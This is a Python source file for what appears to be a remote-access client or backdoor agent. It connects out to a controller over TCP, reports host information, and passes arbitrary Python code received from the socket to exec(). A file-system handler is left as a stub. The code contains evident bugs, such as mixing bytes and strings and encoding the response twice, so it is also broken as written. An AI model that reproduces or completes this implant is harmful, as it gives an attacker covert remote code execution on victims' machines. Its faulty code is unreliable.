import socket
import psutil as ps
import sys
import os
import platform
import pickle
import json

from base64 import b64encode, b64decode

class Client:
    def __init__(self, ip = '127.0.0.1', port = 50405):
        self.ip = ip
        self.port = port
        self.respLookup = {'get-info' : self.getInfo,
            'run-command' : self.runCommand,
            'file-system' : self.fileSystem}

    def run(self):
        self.s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.s.connect((self.ip, self.port))

        while True:
            length = int.from_bytes(self.s.recv(4), 'big')
            msg = ''

            while(len(msg) != length):
                msg = msg + self.s.recv(length - len(msg))

            resp = self.processMessage(msg.decode()).encode()

            self.s.send(len(resp).to_bytes(4, 'big'))
            self.s.send(resp.encode())

    def processMessage(self, msg):
        msg = msg.split('|')
        return self.respLookup[msg[0]](msg[1:] if len(msg) > 1 else None)

    def getInfo(self, args):
        if args is not None and len(args) > 0:
            if args[0] == 'uname':
                return json.dumps(platform.uname())
        else:
            return json.dumps(platform.uname())

    def runCommand(self, args):
        if args is not None and len(args) > 0:
            if args[0] == 'python':
                exec(args[1])

    def fileSystem(self, args):
        pass
